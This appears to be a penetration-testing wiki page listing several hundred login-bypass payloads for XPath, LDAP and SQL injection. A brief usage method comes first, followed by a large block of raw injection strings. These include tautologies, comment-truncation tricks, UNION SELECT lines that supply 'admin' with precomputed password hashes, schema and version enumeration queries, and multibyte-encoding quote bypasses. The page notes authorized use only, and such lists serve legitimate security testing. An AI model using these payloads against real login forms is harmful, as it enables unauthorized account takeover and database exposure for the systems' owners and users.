# SQL Login Bypass Payloads

{{#include ../../banners/hacktricks-training.md}}


This list contains **payloads for testing login bypass through XPath, LDAP, and SQL injection**, in that order.<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

Start by testing the **first 200 entries independently as both username and password**. Then test the complete list in the username field while holding the password constant (for example, _Pass1234._), and repeat in the password field while holding a known username constant (for example, _admin_). Use these payloads only against systems you are authorized to test.

```
admin
password
1234
123456
root
toor
test
guest
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
1234
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
1234 " AND 1=0 UNION ALL SELECT "admin", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
==
=
'
' --
' #
' –
'--
'/*
'#
" --
" #
"/*
' and 1='1
' and a='a
or true
' or ''='
" or ""="
1′) and '1′='1–
' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
" AND 1=0 UNION ALL SELECT "", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
and 1=1
and 1=1–
' and 'one'='one
' and 'one'='one–
' group by password having 1=1--
' group by userid having 1=1--
' group by username having 1=1--
like '%'
or 0=0 --
or 0=0 #
or 0=0 –
' or         0=0 #
' or 0=0 --
' or 0=0 #
' or 0=0 –
" or 0=0 --
" or 0=0 #
" or 0=0 –
%' or '0'='0
or 1=1–
' or 1=1--
' or '1'='1
' or '1'='1'--
' or '1'='1'/*
' or '1'='1'#
' or '1′='1
' or 1=1
' or 1=1 --
' or 1=1 –
' or 1=1;#
' or 1=1/*
' or 1=1#
' or 1=1–
') or '1'='1
') or '1'='1--
') or '1'='1'--
') or '1'='1'/*
') or '1'='1'#
') or ('1'='1
') or ('1'='1--
') or ('1'='1'--
') or ('1'='1'/*
') or ('1'='1'#
'or'1=1
'or'1=1′
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 –
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1–
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1′='1–
) or ('1′='1–
' or 1=1 LIMIT 1;#
'or 1=1 or ''='
"or 1=1 or ""="
' or a=a--
' or a=a–
" or "a"="a
") or ("a"="a
') or ('a'='a and hi") or ("a"="a
' or 'one'='one
' or 'one'='one–
' or uid like '%
' or uname like '%
' or userid like '%
' or user like '%
' or username like '%
') or ('x'='x
' OR 'x'='x'#;
'=' 'or' and '=' 'or'
' UNION ALL SELECT 1, @@version;#
' UNION ALL SELECT system_user(),user();#
' UNION select table_schema,table_name FROM information_Schema.tables;#
admin' and substring(password/text(),1,1)='7
' and substring(password/text(),1,1)='7
"
'-- 2
"-- 2
'='
0'&lt;'2
"="
0"&lt;"2
')
")
')-- 2
')/*
')#
")-- 2
") #
")/*
')-('
')&('
')^('
')*('
')=('
0')&lt;('2
")-("
")&("
")^("
")*("
")=("
0")&lt;("2
'-''-- 2
'-''#
'-''/*
'&''-- 2
'&''#
'&''/*
'^''-- 2
'^''#
'^''/*
'*''-- 2
'*''#
'*''/*
'=''-- 2
'=''#
'=''/*
0'&lt;'2'-- 2
0'&lt;'2'#
0'&lt;'2'/*
"-""-- 2
"-""#
"-""/*
"&""-- 2
"&""#
"&""/*
"^""-- 2
"^""#
"^""/*
"*""-- 2
"*""#
"*""/*
"=""-- 2
"=""#
"=""/*
0"&lt;"2"-- 2
0"&lt;"2"#
0"&lt;"2"/*
')-''-- 2
')-''#
')-''/*
')&''-- 2
')&''#
')&''/*
')^''-- 2
')^''#
')^''/*
')*''-- 2
')*''#
')*''/*
')=''-- 2
')=''#
')=''/*
0')&lt;'2'-- 2
0')&lt;'2'#
0')&lt;'2'/*
")-""-- 2
")-""#
")-""/*
")&""-- 2
")&""#
")&""/*
")^""-- 2
")^""#
")^""/*
")*""-- 2
")*""#
")*""/*
")=""-- 2
")=""#
")=""/*
0")&lt;"2-- 2
0")&lt;"2#
0")&lt;"2/*
'oR'2
'oR'2'-- 2
'oR'2'#
'oR'2'/*
'oR'2'oR'
'oR(2)-- 2
'oR(2)#
'oR(2)/*
'oR(2)oR'
'oR 2-- 2
'oR 2#
'oR 2/*
'oR 2 oR'
'oR/**/2-- 2
'oR/**/2#
'oR/**/2/*
'oR/**/2/**/oR'
"oR"2
"oR"2"-- 2
"oR"2"#
"oR"2"/*
"oR"2"oR"
"oR(2)-- 2
"oR(2)#
"oR(2)/*
"oR(2)oR"
"oR 2-- 2
"oR 2#
"oR 2/*
"oR 2 oR"
"oR/**/2-- 2
"oR/**/2#
"oR/**/2/*
"oR/**/2/**/oR"
'oR'2'='2
'oR'2'='2'oR'
'oR'2'='2'-- 2
'oR'2'='2'#
'oR'2'='2'/*
'oR 2=2-- 2
'oR 2=2#
'oR 2=2/*
'oR 2=2 oR'
'oR/**/2=2-- 2
'oR/**/2=2#
'oR/**/2=2/*
'oR/**/2=2/**/oR'
'oR(2)=2-- 2
'oR(2)=2#
'oR(2)=2/*
'oR(2)=(2)oR'
'oR'2'='2' LimIT 1-- 2
'oR'2'='2' LimIT 1#
'oR'2'='2' LimIT 1/*
'oR(2)=(2)LimIT(1)-- 2
'oR(2)=(2)LimIT(1)#
'oR(2)=(2)LimIT(1)/*
"oR"2"="2
"oR"2"="2"oR"
"oR"2"="2"-- 2
"oR"2"="2"#
"oR"2"="2"/*
"oR 2=2-- 2
"oR 2=2#
"oR 2=2/*
"oR 2=2 oR"
"oR/**/2=2-- 2
"oR/**/2=2#
"oR/**/2=2/*
"oR/**/2=2/**/oR"
"oR(2)=2-- 2
"oR(2)=2#
"oR(2)=2/*
"oR(2)=(2)oR"
"oR"2"="2" LimIT 1-- 2
"oR"2"="2" LimIT 1#
"oR"2"="2" LimIT 1/*
"oR(2)=(2)LimIT(1)-- 2
"oR(2)=(2)LimIT(1)#
"oR(2)=(2)LimIT(1)/*
'oR true-- 2
'oR true#
'oR true/*
'oR true oR'
'oR(true)-- 2
'oR(true)#
'oR(true)/*
'oR(true)oR'
'oR/**/true-- 2
'oR/**/true#
'oR/**/true/*
'oR/**/true/**/oR'
"oR true-- 2
"oR true#
"oR true/*
"oR true oR"
"oR(true)-- 2
"oR(true)#
"oR(true)/*
"oR(true)oR"
"oR/**/true-- 2
"oR/**/true#
"oR/**/true/*
"oR/**/true/**/oR"
'oR'2'LiKE'2
'oR'2'LiKE'2'-- 2
'oR'2'LiKE'2'#
'oR'2'LiKE'2'/*
'oR'2'LiKE'2'oR'
'oR(2)LiKE(2)-- 2
'oR(2)LiKE(2)#
'oR(2)LiKE(2)/*
'oR(2)LiKE(2)oR'
"oR"2"LiKE"2
"oR"2"LiKE"2"-- 2
"oR"2"LiKE"2"#
"oR"2"LiKE"2"/*
"oR"2"LiKE"2"oR"
"oR(2)LiKE(2)-- 2
"oR(2)LiKE(2)#
"oR(2)LiKE(2)/*
"oR(2)LiKE(2)oR"
admin
admin'-- 2
admin'#
admin"-- 2
admin"#
ffifdyop
' UniON SElecT 1,2-- 2
' UniON SElecT 1,2,3-- 2
' UniON SElecT 1,2,3,4-- 2
' UniON SElecT 1,2,3,4,5-- 2
' UniON SElecT 1,2#
' UniON SElecT 1,2,3#
' UniON SElecT 1,2,3,4#
' UniON SElecT 1,2,3,4,5#
'UniON(SElecT(1),2)-- 2
'UniON(SElecT(1),2,3)-- 2
'UniON(SElecT(1),2,3,4)-- 2
'UniON(SElecT(1),2,3,4,5)-- 2
'UniON(SElecT(1),2)#
'UniON(SElecT(1),2,3)#
'UniON(SElecT(1),2,3,4)#
'UniON(SElecT(1),2,3,4,5)#
" UniON SElecT 1,2-- 2
" UniON SElecT 1,2,3-- 2
" UniON SElecT 1,2,3,4-- 2
" UniON SElecT 1,2,3,4,5-- 2
" UniON SElecT 1,2#
" UniON SElecT 1,2,3#
" UniON SElecT 1,2,3,4#
" UniON SElecT 1,2,3,4,5#
"UniON(SElecT(1),2)-- 2
"UniON(SElecT(1),2,3)-- 2
"UniON(SElecT(1),2,3,4)-- 2
"UniON(SElecT(1),2,3,4,5)-- 2
"UniON(SElecT(1),2)#
"UniON(SElecT(1),2,3)#
"UniON(SElecT(1),2,3,4)#
"UniON(SElecT(1),2,3,4,5)#
'||'2
'||2-- 2
'||'2'||'
'||2#
'||2/*
'||2||'
"||"2
"||2-- 2
"||"2"||"
"||2#
"||2/*
"||2||"
'||'2'='2
'||'2'='2'||'
'||2=2-- 2
'||2=2#
'||2=2/*
'||2=2||'
"||"2"="2
"||"2"="2"||"
"||2=2-- 2
"||2=2#
"||2=2/*
"||2=2||"
'||2=(2)LimIT(1)-- 2
'||2=(2)LimIT(1)#
'||2=(2)LimIT(1)/*
"||2=(2)LimIT(1)-- 2
"||2=(2)LimIT(1)#
"||2=(2)LimIT(1)/*
'||true-- 2
'||true#
'||true/*
'||true||'
"||true-- 2
"||true#
"||true/*
"||true||"
'||'2'LiKE'2
'||'2'LiKE'2'-- 2
'||'2'LiKE'2'#
'||'2'LiKE'2'/*
'||'2'LiKE'2'||'
'||(2)LiKE(2)-- 2
'||(2)LiKE(2)#
'||(2)LiKE(2)/*
'||(2)LiKE(2)||'
"||"2"LiKE"2
"||"2"LiKE"2"-- 2
"||"2"LiKE"2"#
"||"2"LiKE"2"/*
"||"2"LiKE"2"||"
"||(2)LiKE(2)-- 2
"||(2)LiKE(2)#
"||(2)LiKE(2)/*
"||(2)LiKE(2)||"
')oR('2
')oR'2'-- 2
')oR'2'#
')oR'2'/*
')oR'2'oR('
')oR(2)-- 2
')oR(2)#
')oR(2)/*
')oR(2)oR('
')oR 2-- 2
')oR 2#
')oR 2/*
')oR 2 oR('
')oR/**/2-- 2
')oR/**/2#
')oR/**/2/*
')oR/**/2/**/oR('
")oR("2
")oR"2"-- 2
")oR"2"#
")oR"2"/*
")oR"2"oR("
")oR(2)-- 2
")oR(2)#
")oR(2)/*
")oR(2)oR("
")oR 2-- 2
")oR 2#
")oR 2/*
")oR 2 oR("
")oR/**/2-- 2
")oR/**/2#
")oR/**/2/*
")oR/**/2/**/oR("
')oR'2'=('2
')oR'2'='2'oR('
')oR'2'='2'-- 2
')oR'2'='2'#
')oR'2'='2'/*
')oR 2=2-- 2
')oR 2=2#
')oR 2=2/*
')oR 2=2 oR('
')oR/**/2=2-- 2
')oR/**/2=2#
')oR/**/2=2/*
')oR/**/2=2/**/oR('
')oR(2)=2-- 2
')oR(2)=2#
')oR(2)=2/*
')oR(2)=(2)oR('
')oR'2'='2' LimIT 1-- 2
')oR'2'='2' LimIT 1#
')oR'2'='2' LimIT 1/*
')oR(2)=(2)LimIT(1)-- 2
')oR(2)=(2)LimIT(1)#
')oR(2)=(2)LimIT(1)/*
")oR"2"=("2
")oR"2"="2"oR("
")oR"2"="2"-- 2
")oR"2"="2"#
")oR"2"="2"/*
")oR 2=2-- 2
")oR 2=2#
")oR 2=2/*
")oR 2=2 oR("
")oR/**/2=2-- 2
")oR/**/2=2#
")oR/**/2=2/*
")oR/**/2=2/**/oR("
")oR(2)=2-- 2
")oR(2)=2#
")oR(2)=2/*
")oR(2)=(2)oR("
")oR"2"="2" LimIT 1-- 2
")oR"2"="2" LimIT 1#
")oR"2"="2" LimIT 1/*
")oR(2)=(2)LimIT(1)-- 2
")oR(2)=(2)LimIT(1)#
")oR(2)=(2)LimIT(1)/*
')oR true-- 2
')oR true#
')oR true/*
')oR true oR('
')oR(true)-- 2
')oR(true)#
')oR(true)/*
')oR(true)oR('
')oR/**/true-- 2
')oR/**/true#
')oR/**/true/*
')oR/**/true/**/oR('
")oR true-- 2
")oR true#
")oR true/*
")oR true oR("
")oR(true)-- 2
")oR(true)#
")oR(true)/*
")oR(true)oR("
")oR/**/true-- 2
")oR/**/true#
")oR/**/true/*
")oR/**/true/**/oR("
')oR'2'LiKE('2
')oR'2'LiKE'2'-- 2
')oR'2'LiKE'2'#
')oR'2'LiKE'2'/*
')oR'2'LiKE'2'oR('
')oR(2)LiKE(2)-- 2
')oR(2)LiKE(2)#
')oR(2)LiKE(2)/*
')oR(2)LiKE(2)oR('
")oR"2"LiKE("2
")oR"2"LiKE"2"-- 2
")oR"2"LiKE"2"#
")oR"2"LiKE"2"/*
")oR"2"LiKE"2"oR("
")oR(2)LiKE(2)-- 2
")oR(2)LiKE(2)#
")oR(2)LiKE(2)/*
")oR(2)LiKE(2)oR("
admin')-- 2
admin')#
admin')/*
admin")-- 2
admin")#
') UniON SElecT 1,2-- 2
') UniON SElecT 1,2,3-- 2
') UniON SElecT 1,2,3,4-- 2
') UniON SElecT 1,2,3,4,5-- 2
') UniON SElecT 1,2#
') UniON SElecT 1,2,3#
') UniON SElecT 1,2,3,4#
') UniON SElecT 1,2,3,4,5#
')UniON(SElecT(1),2)-- 2
')UniON(SElecT(1),2,3)-- 2
')UniON(SElecT(1),2,3,4)-- 2
')UniON(SElecT(1),2,3,4,5)-- 2
')UniON(SElecT(1),2)#
')UniON(SElecT(1),2,3)#
')UniON(SElecT(1),2,3,4)#
')UniON(SElecT(1),2,3,4,5)#
") UniON SElecT 1,2-- 2
") UniON SElecT 1,2,3-- 2
") UniON SElecT 1,2,3,4-- 2
") UniON SElecT 1,2,3,4,5-- 2
") UniON SElecT 1,2#
") UniON SElecT 1,2,3#
") UniON SElecT 1,2,3,4#
") UniON SElecT 1,2,3,4,5#
")UniON(SElecT(1),2)-- 2
")UniON(SElecT(1),2,3)-- 2
")UniON(SElecT(1),2,3,4)-- 2
")UniON(SElecT(1),2,3,4,5)-- 2
")UniON(SElecT(1),2)#
")UniON(SElecT(1),2,3)#
")UniON(SElecT(1),2,3,4)#
")UniON(SElecT(1),2,3,4,5)#
')||('2
')||2-- 2
')||'2'||('
')||2#
')||2/*
')||2||('
")||("2
")||2-- 2
")||"2"||("
")||2#
")||2/*
")||2||("
')||'2'=('2
')||'2'='2'||('
')||2=2-- 2
')||2=2#
')||2=2/*
')||2=2||('
")||"2"=("2
")||"2"="2"||("
")||2=2-- 2
")||2=2#
")||2=2/*
")||2=2||("
')||2=(2)LimIT(1)-- 2
')||2=(2)LimIT(1)#
')||2=(2)LimIT(1)/*
")||2=(2)LimIT(1)-- 2
")||2=(2)LimIT(1)#
")||2=(2)LimIT(1)/*
')||true-- 2
')||true#
')||true/*
')||true||('
")||true-- 2
")||true#
")||true/*
")||true||("
')||'2'LiKE('2
')||'2'LiKE'2'-- 2
')||'2'LiKE'2'#
')||'2'LiKE'2'/*
')||'2'LiKE'2'||('
')||(2)LiKE(2)-- 2
')||(2)LiKE(2)#
')||(2)LiKE(2)/*
')||(2)LiKE(2)||('
")||"2"LiKE("2
")||"2"LiKE"2"-- 2
")||"2"LiKE"2"#
")||"2"LiKE"2"/*
")||"2"LiKE"2"||("
")||(2)LiKE(2)-- 2
")||(2)LiKE(2)#
")||(2)LiKE(2)/*
")||(2)LiKE(2)||("
' UnION SELeCT 1,2`
' UnION SELeCT 1,2,3`
' UnION SELeCT 1,2,3,4`
' UnION SELeCT 1,2,3,4,5`
" UnION SELeCT 1,2`
" UnION SELeCT 1,2,3`
" UnION SELeCT 1,2,3,4`
" UnION SELeCT 1,2,3,4,5`
' or 1=1 limit 1 -- -+
'="or'
Pass1234.
Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658
Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658'#
Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.
Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.')#
Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61
Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61'#
Pass1234.' and 1=0 union select 'admin',sha('Pass1234.
Pass1234.' and 1=0 union select 'admin',sha('Pass1234.')#
Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658
Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658"#
Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.
Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.")#
Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61
Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61"#
Pass1234." and 1=0 union select "admin",sha("Pass1234.
Pass1234." and 1=0 union select "admin",sha("Pass1234.")#
%A8%27 Or 1=1-- 2
%8C%A8%27 Or 1=1-- 2
%bf' Or 1=1 -- 2
%A8%27 Or 1-- 2
%8C%A8%27 Or 1-- 2
%bf' Or 1-- 2
%A8%27Or(1)-- 2
%8C%A8%27Or(1)-- 2
%bf'Or(1)-- 2
%A8%27||1-- 2
%8C%A8%27||1-- 2
%bf'||1-- 2
%A8%27) Or 1=1-- 2
%8C%A8%27) Or 1=1-- 2
%bf') Or 1=1 -- 2
%A8%27) Or 1-- 2
%8C%A8%27) Or 1-- 2
%bf') Or 1-- 2
%A8%27)Or(1)-- 2
%8C%A8%27)Or(1)-- 2
%bf')Or(1)-- 2
%A8%27)||1-- 2
%8C%A8%27)||1-- 2
%bf')||1-- 2
```

## References

- [1] [OWASP Web Security Testing Guide – Testing for XPath Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection)
- [2] [OWASP Web Security Testing Guide – Testing for LDAP Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection)
- [3] [PayloadsAllTheThings – SQL Injection Authentication Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

{{#include ../../banners/hacktricks-training.md}}
